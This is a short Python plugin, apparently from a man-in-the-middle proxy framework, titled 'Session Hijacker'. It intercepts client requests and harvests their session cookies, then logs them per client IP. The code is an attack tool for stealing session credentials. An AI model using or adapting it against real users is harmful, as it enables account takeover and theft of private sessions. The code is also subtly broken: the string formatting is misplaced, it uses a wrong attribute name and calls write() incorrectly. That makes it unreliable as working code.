from plugins.plugin import Plugin
import os
import argparse
import logging

class SessionHijacker(Plugin):
	name = "Session Hijacker"
	optname = "hijack"
	desc = "Performs session hijacking attacks against clients"
	implements = ["sendHeaders"]
	has_opts = False

	def initialize(self, options):
		'''Called if plugin is enabled, passed the options namespace'''
		self.options = options
		self.log_clients = options.clients

	def sendHeaders(self, request):
		for header, value in request.headers.items():
			if header == 'cookie':
				if self.log_clients:
					log_file = open('./logs/%s.log', 'a' % request.client.getClientIP())
					log_file.write(request.header['host'], value, "\n")
					log_file.close()

					logging.info("%s %s << Wrote cookie to logfile" % (request.client.getClientIP(), request.headers['host']))
				else:
					logging.info("%s %s << Got cookie: %s" % (request.client.getClientIP(), request.headers['host'], value))

	#def add_options(options):